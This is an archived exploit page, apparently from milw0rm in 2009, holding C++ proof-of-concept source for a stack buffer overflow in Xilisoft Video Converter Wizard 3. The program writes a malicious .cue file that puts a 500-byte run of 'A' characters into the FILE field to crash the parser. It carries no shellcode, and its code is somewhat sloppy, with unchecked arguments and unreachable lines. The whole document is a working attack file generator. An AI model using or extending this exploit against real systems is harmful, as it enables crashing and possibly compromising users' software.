<html><head><title>Xilisoft Video Converter Wizard 3 .CUE File Stack Buffer Overflow PoC</title></head><pre>/*
----------------------------------------------------------------------------------------
Xilisoft Video Converter Wizard 3 .CUE File Stack Buffer Overflow POC

name: xilisoft.cpp

Credits : fl0 fl0w
----------------------------------------------------------------------------------------
ScreanShot in the debugger

Link: http://www.downloadatoz.com/xilisoft-video-converter/wizard.html

http://img23.imageshack.us/my.php?image=xilisoftvideoconverter.jpg
----------------------------------------------------------------------------------------
*/

//Start

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;
#include &lt;windows.h&gt;

#define     SIZE 100000

#define     FILE_FF &quot; BINARY.. TRACK 01 MODE2/2352.. INDEX 01 00:00:00..&quot;  

class EXPLOIT {
	public:
	
int check (char *, char *);
void Usage (char *);
 };
 
static int  Poz = 1;
static int  Neg = 0;
  
int i;      

char Name [SIZE];    
char NeWbuff [SIZE];
                                            

                                                  int main (int argc, char *argv [])                                                                                           

 { 
         
        EXPLOIT VIDEO;
        
             
             if ( argc &lt; 2) 
             
                VIDEO.Usage ( argv [0]); 
       
                                                  if ( VIDEO.check ( argv [1], &quot;-file&quot;) == Neg) { 
                                                   
                                                       fprintf ( stdout , &quot; Incorect input &quot;); 
                                                       
                                                       printf ( &quot; \t..Usage is %s -file filename.. \n&quot;, Name);
                                                                                                                              
                                                               exit ( 0);
                                                            
                                                            }
                                               
                                                                                 
        
        
          do {
        
            NeWbuff [i] = 'A';
         
            i++;
               
            }while (i &lt; 500);
               
       
        
        FILE *f;
        
        strcpy (Name, argv [2]);
        
        strcat (Name, &quot; .cue &quot;);
        
        f = fopen (Name, &quot;w&quot;);
        
        assert ( f != NULL);
        
        
        
        
        strncpy ( NeWbuff + 500 , FILE_FF , strlen ( FILE_FF)); 
                                                                 
          
        
        fputs(&quot;FILE \&quot;&quot;, f);
        
        fprintf ( f, &quot; %s &quot;, NeWbuff);
               
                
        fprintf ( stdout , &quot;File build ! &quot;);
         
        exit ( 0);  
         
       getchar ();
       
                                                   return 0;        
                                                  }
                                                                                                    

                                                         
  
                                                  int EXPLOIT::check (char *Arg_, char *_Arg)
   
   {
        
       if ( strcmp ( Arg_, _Arg) == 0)
       
        return Poz;
        
      return Neg;
        
        }   
        
    void EXPLOIT::Usage (char *Name)
    
   {
     system (&quot;cls&quot;);    
     fprintf ( stdout , &quot; \n..Xilisoft Video Converter Wizard 3 .CUE File Stack Buffer Overflow POC..\n &quot;);
     printf ( &quot; \t..Usage is %s -file filename.. \n&quot;, Name);    
     fprintf ( stdout , &quot;..All Credits fl0 fl0w.. \n&quot;);
     
     
         }   
         
        
//EOF           

// milw0rm.com [2009-04-10]</pre></html>